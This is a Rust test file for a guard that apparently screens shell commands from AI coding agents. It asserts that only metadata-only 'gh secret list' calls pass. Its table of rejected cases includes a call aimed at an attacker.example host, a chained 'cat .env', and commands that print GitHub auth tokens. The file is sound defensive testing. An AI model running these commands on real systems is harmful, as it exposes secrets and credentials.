use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;

#[test]
fn secret_namespace_is_metadata_only_after_a_complete_read_proof() {
    for harness in ["codex", "zcode", "claude-code", "omp", "cursor"] {
        for (command, benign) in [
            ("gh secret list", true),
            ("gh secret list --env preview", true),
            ("gh --repo owner/repo secret list --json name", true),
            ("gh secret list --repo owner/repo", true),
            ("gh secret list --show-token", false),
            ("gh secret list --env password", false),
            ("gh secret list --jq env", false),
            ("gh secret list --hostname attacker.example", false),
            ("gh secret list > names.txt", false),
            ("gh secret list; cat .env", false),
            ("gh secret set TOKEN --body value", false),
            ("gh config get oauth_token", false),
            ("gh auth token", false),
        ] {
            let result = evaluate_pre_tool_envelope_with_context(
                harness,
                "PreToolUse",
                &json!({"tool_name":"Bash","tool_input":{"command":command}}),
                None,
                None,
                None,
                None,
            );
            assert_eq!(
                result.minimum_action == "allow",
                benign,
                "{harness}: {command}: {result:?}"
            );
        }
    }
}
